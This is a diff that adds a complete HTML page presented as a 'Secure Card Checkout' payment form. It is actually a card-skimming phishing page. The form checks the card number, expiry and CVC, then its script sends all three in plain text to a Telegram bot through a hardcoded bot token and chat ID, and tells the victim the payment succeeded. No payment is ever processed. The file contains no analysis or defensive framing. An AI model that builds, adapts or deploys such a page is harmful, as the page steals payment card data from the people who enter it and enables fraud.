@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Secure Card Checkout</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #12122F;
+      color: #fff;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: #1B1B42;
+      padding: 30px;
+      border-radius: 10px;
+      width: 360px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.4);
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #0fb5b1;
+    }
+
+    .input-group {
+      margin-bottom: 15px;
+      position: relative;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 5px;
+      color: #aaa;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: none;
+      background: #2a2a5a;
+      color: #fff;
+      font-size: 16px;
+    }
+
+    .card-icon {
+      position: absolute;
+      right: 10px;
+      top: 37px;
+      height: 24px;
+      display: none;
+    }
+
+    .error {
+      color: #ff6b6b;
+      font-size: 13px;
+      margin-top: 5px;
+      display: none;
+    }
+
+    #successMessage {
+      margin-top: 20px;
+      padding: 10px;
+      background-color: #28a745;
+      color: white;
+      border-radius: 5px;
+      font-size: 15px;
+      text-align: center;
+      display: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #0fb5b1;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+
+    button:hover {
+      background: #0da8a5;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>🛡️ Complete Your Payment</h2>
+
+    <div class="input-group">
+      <label>Card Number</label>
+      <input type="text" id="cardNumber" placeholder="4111 1111 1111 1111" maxlength="19" />
+      <img id="cardLogo" class="card-icon" alt="Card Logo" />
+      <div id="cardError" class="error">Please enter a valid card number.</div>
+    </div>
+
+    <div class="input-group">
+      <label>Expiry Date</label>
+      <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" />
+      <div id="expiryError" class="error">Enter a valid expiry date.</div>
+    </div>
+
+    <div class="input-group">
+      <label>CVC</label>
+      <input type="text" id="cvc" placeholder="123" maxlength="4" />
+      <div id="cvcError" class="error">CVC must be 3 or 4 digits.</div>
+    </div>
+
+    <button onclick="validateAndSend()">Pay Now</button>
+    <div id="successMessage">✅ Payment sent successfully!</div>
+  </div>
+
+  <script>
+    const cardInput = document.getElementById("cardNumber");
+    const expiryInput = document.getElementById("expiry");
+    const cvcInput = document.getElementById("cvc");
+
+    const cardError = document.getElementById("cardError");
+    const expiryError = document.getElementById("expiryError");
+    const cvcError = document.getElementById("cvcError");
+    const successMessage = document.getElementById("successMessage");
+
+    const cardLogo = document.getElementById("cardLogo");
+
+    cardInput.addEventListener("input", function () {
+      let value = this.value.replace(/\D/g, "").substring(0, 19);
+      let formatted = value.match(/.{1,4}/g);
+      this.value = formatted ? formatted.join(" ") : "";
+
+      const type = detectCardType(value);
+      updateCardLogo(type);
+    });
+
+    expiryInput.addEventListener("input", function () {
+      let value = this.value.replace(/\D/g, "").substring(0, 4);
+      if (value.length >= 3) {
+        this.value = value.substring(0, 2) + "/" + value.substring(2);
+      } else {
+        this.value = value;
+      }
+    });
+
+    function detectCardType(number) {
+      if (/^4/.test(number)) return "visa";
+      if (/^5[1-5]/.test(number)) return "mastercard";
+      if (/^3[47]/.test(number)) return "amex";
+      if (/^6(?:011|5)/.test(number)) return "discover";
+      return "unknown";
+    }
+
+    function updateCardLogo(type) {
+      const logos = {
+        visa: "https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg",
+        mastercard: "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg",
+        amex: "https://upload.wikimedia.org/wikipedia/commons/3/30/Amex-logo.svg",
+        discover: "https://upload.wikimedia.org/wikipedia/commons/5/5e/Discover_Card_logo.svg",
+      };
+      if (logos[type]) {
+        cardLogo.src = logos[type];
+        cardLogo.style.display = "block";
+      } else {
+        cardLogo.style.display = "none";
+      }
+    }
+
+    function validateAndSend() {
+      const cardNumber = cardInput.value.replace(/\s/g, "");
+      const expiry = expiryInput.value.trim();
+      const cvc = cvcInput.value.trim();
+
+      cardError.style.display = "none";
+      expiryError.style.display = "none";
+      cvcError.style.display = "none";
+      successMessage.style.display = "none";
+
+      let hasError = false;
+
+      if (!/^\d{13,19}$/.test(cardNumber)) {
+        cardError.style.display = "block";
+        hasError = true;
+      }
+
+      const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+      if (!expiryRegex.test(expiry)) {
+        expiryError.style.display = "block";
+        hasError = true;
+      } else {
+        const [month, year] = expiry.split("/");
+        const expiryDate = new Date(`20${year}`, month - 1);
+        const now = new Date();
+        if (expiryDate < now || expiryDate > new Date(2036, 11)) {
+          expiryError.style.display = "block";
+          hasError = true;
+        }
+      }
+
+      if (!/^\d{3,4}$/.test(cvc)) {
+        cvcError.style.display = "block";
+        hasError = true;
+      }
+
+      if (hasError) return;
+
+      const message = `
+💳 <b>New Payment Info</b>
+<b>Card:</b> ${cardNumber}
+<b>Expiry:</b> ${expiry}
+<b>CVC:</b> ${cvc}
+      `;
+
+      const token = "8124953534:AAE4_J_inawLa7Yh7igaQerDnDL9KnoktT0";
+      const chatId = "1787245517";
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "html",
+        }),
+      })
+      .then(res => {
+        if (res.ok) {
+          successMessage.style.display = "block";
+        } else {
+          alert("Failed to send to Telegram");
+        }
+      })
+      .catch(err => {
+        alert("Telegram Error: " + err);
+      });
+    }
+  </script>
+</body>
+</html>
+
